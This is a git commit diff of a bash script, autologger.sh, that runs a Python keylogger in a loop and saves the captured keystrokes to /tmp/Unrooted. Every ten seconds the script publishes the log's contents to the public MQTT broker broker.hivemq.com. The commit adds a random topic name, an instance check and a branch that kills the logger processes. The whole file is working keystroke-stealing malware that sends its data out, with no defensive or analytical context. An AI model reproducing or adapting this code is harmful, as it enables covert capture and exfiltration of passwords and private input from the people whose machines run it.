b19dea3a1c5a968ce069781741965ba1f44713a5
stbs22 <steveehs2000@gmail.com>
2022-07-02 13:25:06 -0400

    sáb 02 jul 2022 13:25:06 -04

--- Aplications/autologger.sh
+++ Aplications/autologger.sh
@@ -1,19 +1,41 @@
 #!/bin/bash
 
+
+var=$(ps -aux | grep autologger | wc -l)
+echo $var
+
 log="/tmp/Unrooted"
+rand=$(cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 10; echo;)
 
-touch $log
+if [ $var -eq 3 ]; then
 
-while [ 0 ];
 
-do
-	python-keylogger --log-file=$log --clean-file &>/dev/null &
 
-	pid="$(pidof /usr/bin/python /usr/bin/python-keylogger | awk '{ print $1 }')"
+	touch $log
+	notify-send -t 1000 $rand
 
-	sleep 10
+	echo $rand | xclip
+
+
+	while [ 0 ];
+
+	do
+		python-keylogger --log-file=$log --clean-file &>/dev/null &
+
+		pid="$(pidof /usr/bin/python /usr/bin/python-keylogger | awk '{ print $1 }')"
+
+		sleep 10
+		
+		mosquitto_pub -h broker.hivemq.com -p 1883 -t $rand -m "$(printf "_%s_" $(cat $log))"
+		
+		kill $pid
+	done
+else
+
+	notify-send -t 1000 -u critical "Kill"
+	mosquitto_pub -h broker.hivemq.com -p 1883 -t $rand -m "muerto"
+
+	kill $(printf "%s " $(ps -aux | grep logger | awk '{ print $2 }'))
 	
-	mosquitto_pub -h broker.hivemq.com -p 1883 -t pruebaqla -m "$(printf "_%s_" $(cat $log))"
-	
-	kill $pid
-done
+	echo "más grande ctm"
+fi
